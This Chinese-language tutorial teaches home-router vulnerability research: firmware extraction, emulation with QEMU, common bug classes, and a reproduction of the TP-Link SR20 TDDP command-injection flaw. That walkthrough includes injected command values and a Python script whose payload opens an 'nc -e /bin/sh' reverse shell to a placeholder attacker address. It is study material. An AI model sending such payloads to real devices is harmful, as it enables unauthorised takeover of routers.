![](img/96bdca56a3c74ffc99c5ce5f7128d400_0.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_2.png)

# 课程P1：家用路由器漏洞挖掘入门 🛠️

在本节课中，我们将学习家用路由器漏洞挖掘的基础知识。课程内容涵盖路由器漏洞挖掘的意义、所需知识、硬件组成、固件获取、仿真环境搭建，并通过一个实战案例演示命令执行漏洞的利用过程。

## 概述 📖

家用路由器是我们接触最多的物联网设备之一，其固件易于获取，且通常带有Web管理界面，是学习物联网安全技术的良好起点。本节课将从硬件、固件、Web层面等多个角度，系统性地介绍路由器漏洞挖掘的入门方法。

## 路由器漏洞挖掘的意义 🎯

挖掘路由器漏洞具有多重意义。首先，家用路由器是接触广泛的物联网设备，其固件容易获得，便于进行安全研究。其次，掌握路由器漏洞挖掘技术可以作为挖掘其他智能硬件（如智能摄像头、智能音箱）的基础。最后，路由器的Web管理界面是常见的攻击面，存在大量如命令执行、越权等漏洞，适合Web安全研究人员上手。

## 所需掌握的知识 📚

以下是进行路由器漏洞挖掘需要了解的基础知识。

### 硬件知识

虽然核心关注点在固件和Web层面，但了解基本硬件组成有助于识别和分析设备。

*   **CPU**：路由器的中央控制单元，常见品牌有联发科、博通等。
*   **调试口**：最常见的是UART串口，用于与PC通信，获取调试信息，辅助分析文件系统。
*   **Flash ROM**：存储文件系统、内核、启动引导程序（U-Boot）和路由器配置信息的关键芯片。

### 固件知识

固件分析是路由器漏洞挖掘的核心。

*   **固件获取**：
    1.  从设备官网的技术支持页面下载升级包。
    2.  在路由器本地OTA升级时抓包获取。
    3.  通过编程器从Flash ROM芯片中直接读取。
*   **固件提取**：通常使用 **`binwalk`** 工具自动提取固件中的文件系统。命令示例：`binwalk -Me firmware.bin`
*   **BusyBox**：一个集成了众多Linux命令的软件工具包，常见于嵌入式设备。可以将其视为Linux命令的集合。

### 汇编与系统知识

![](img/96bdca56a3c74ffc99c5ce5f7128d400_4.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_5.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_6.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_8.png)

*   **MIPS/ARM汇编**：这两种指令集同属于RISC架构，广泛应用于嵌入式设备。需要了解其基本语法和寄存器用法，例如：
    *   `addiu $a0, $a0, 1`  # 将寄存器$a0的值加1后存回$a0
    *   `lw $a0, 0x1000`     # 将内存地址0x1000处的值（4字节）加载到寄存器$a0
    *   `jalr $t9`           # 跳转到$t9寄存器指向的地址，并将返回地址存入$ra寄存器
*   **系统类型**：路由器操作系统多为Linux，也有VxWorks。Linux系统更常见且易于分析。

![](img/96bdca56a3c74ffc99c5ce5f7128d400_10.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_12.png)

## 仿真环境搭建 💻

![](img/96bdca56a3c74ffc99c5ce5f7128d400_14.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_16.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_18.png)

在实际漏洞挖掘中，通常使用仿真环境而非实体设备。

上一节我们介绍了所需的基础知识，本节中我们来看看如何搭建一个可运行路由器固件的仿真环境。

![](img/96bdca56a3c74ffc99c5ce5f7128d400_20.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_21.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_23.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_24.png)

以下是搭建环境所需的工具列表：

*   **QEMU**：用于模拟整个路由器系统的虚拟机软件。推荐安装2.4版本的编译版以获得最佳稳定性。
*   **IDA Pro / Ghidra**：用于逆向分析二进制文件的工具。Ghidra尤其适合分析MIPS架构。
*   **GDB**：调试工具，可配合针对MIPS/ARM架构的增强版使用。
*   **Firmadyne**：一个自动化仿真固件的工具，可以简化QEMU的操作流程。
*   **binwalk**：固件提取和分析的核心工具。

安装QEMU后，可以使用Firmadyne工具自动完成固件的解压、架构识别、镜像制作和网络配置，最终运行起一个仿真的路由器环境，并通过Web界面进行访问和测试。

## 漏洞挖掘特点与思路 🔍

路由器漏洞挖掘的测试点较为全面。

### 漏洞特点

1.  **测试层面多**：涵盖Web界面、二进制固件、私有通信协议等。
2.  **需要一定硬件接触**：有时需要拆卸设备、读取Flash芯片。
3.  **支持代码审计**：提取固件后，可对Web目录下的脚本（如PHP）进行白盒审计。

### 常见漏洞点举例

![](img/96bdca56a3c74ffc99c5ce5f7128d400_26.png)

*   **Web层面**：
    *   **XSS**：由于对用户输入过滤不严导致。例如PHP代码：`echo $_GET[‘test’];`
    *   **越权**：未对敏感功能进行权限验证。例如未授权访问导出配置文件的接口。
*   **二进制层面**：
    *   **命令执行**：最常见，通常因不安全地调用`system`、`popen`等函数导致。例如C代码：`system(buf);` 其中`buf`内容用户可控。
    *   **栈溢出**：常因`strcpy`、`sprintf`等函数使用不当造成。例如：`sprintf(stack_buf, “Cookie: %s”, getenv(“HTTP_COOKIE”));`
*   **协议层面**：路由器自定义的私有协议（如TP-Link的TDDP协议）可能因处理逻辑缺陷导致命令执行等漏洞。

### 挖掘思路

![](img/96bdca56a3c74ffc99c5ce5f7128d400_28.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_30.png)

1.  **Web测试**：对管理界面进行常规的Web漏洞测试。
2.  **端口渗透**：探测路由器开放的端口（如Telnet、SSH、私有协议端口），尝试爆破或连接分析。
3.  **串口调试**：通过UART口获取系统信息，尝试导出文件系统。
4.  **白盒测试**：获取固件后，逆向分析与Web交互的关键二进制文件（如CGI程序），查找危险函数调用点。
5.  **敏感信息收集**：在文件系统中搜索硬编码的密码、密钥等敏感信息。

![](img/96bdca56a3c74ffc99c5ce5f7128d400_32.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_34.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_36.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_38.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_40.png)

## 实战演示：TP-Link SR20 命令执行漏洞复现 ⚔️

![](img/96bdca56a3c74ffc99c5ce5f7128d400_42.png)

本节我们将通过复现一个真实的漏洞，来具体理解路由器漏洞的挖掘与利用过程。我们将分析TP-Link SR20路由器中TDDP协议的一个命令执行漏洞。

### 环境准备

![](img/96bdca56a3c74ffc99c5ce5f7128d400_44.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_46.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_48.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_50.png)

*   固件版本：1.0.0
*   仿真工具：QEMU (system mode)
*   分析工具：IDA Pro, binwalk
*   利用脚本：Python (使用socket模块)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_52.png)

### 漏洞分析

![](img/96bdca56a3c74ffc99c5ce5f7128d400_54.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_56.png)

漏洞位于处理TDDP协议（UDP 1040端口）的二进制程序中。关键函数片段如下：

```c
// 伪代码
void vulnerable_function(char *input) {
    char file_name[256];
    char ip[256];
    // 使用sscanf解析输入，以‘/’为分隔符
    sscanf(input, “%[^/]/%s”, file_name, ip);
    // 将可控的file_name拼接到命令中
    char command[512];
    sprintf(command, “/bin/sh -c ‘tftp -g -r %s -l /tmp/file %s’”, file_name, ip);
    // 执行命令
    system(command);
}
```

![](img/96bdca56a3c74ffc99c5ce5f7128d400_58.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_60.png)

攻击者可以构造特殊的UDP数据包，使`file_name`参数包含命令分隔符`;`或反引号，从而注入任意命令。例如，构造`file_name`为`file;reboot;/`，最终执行的命令将变为`tftp -g -r file;reboot; -l /tmp/file 192.168.1.100`，导致路由器重启。

### 漏洞复现步骤

1.  **提取与仿真**：使用`binwalk`提取固件，利用QEMU的system模式运行整个文件系统。
2.  **启动服务**：在仿真环境中运行存在漏洞的TDDP服务程序。
3.  **构造利用**：编写Python脚本，向路由器的1040/UDP端口发送精心构造的数据包。数据包需要符合协议格式，并在特定偏移位置插入命令注入载荷。
    ```python
    # 示例脚本框架
    import socket
    payload = b’\x01\x31’ + b’A’*12 + b’file;nc -e /bin/sh 攻击者IP 端口;/’
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (‘路由器IP’, 1040))
    ```
4.  **执行利用**：在攻击机上监听相应端口，运行脚本后，将获得一个反弹shell，成功在路由器上执行任意命令。

![](img/96bdca56a3c74ffc99c5ce5f7128d400_62.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_64.png)

该漏洞在后续版本中通过移除有问题的功能分支（switch case）进行了修复。

![](img/96bdca56a3c74ffc99c5ce5f7128d400_66.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_68.png)

![](img/96bdca56a3c74ffc99c5ce5f7128d400_69.png)

## 总结 🎓

![](img/96bdca56a3c74ffc99c5ce5f7128d400_71.png)

本节课我们一起学习了家用路由器漏洞挖掘的完整入门路径。我们从挖掘意义和所需知识出发，了解了路由器的硬件组成和固件获取方法。接着，我们学习了如何搭建仿真环境来运行和分析固件。然后，我们探讨了路由器漏洞的特点、常见类型以及挖掘思路。最后，通过复现TP-Link SR20的命令执行漏洞，我们将理论知识应用于实践，完整地体验了从分析到利用的漏洞挖掘过程。

希望本教程能为你的物联网安全学习之旅提供一个清晰的起点。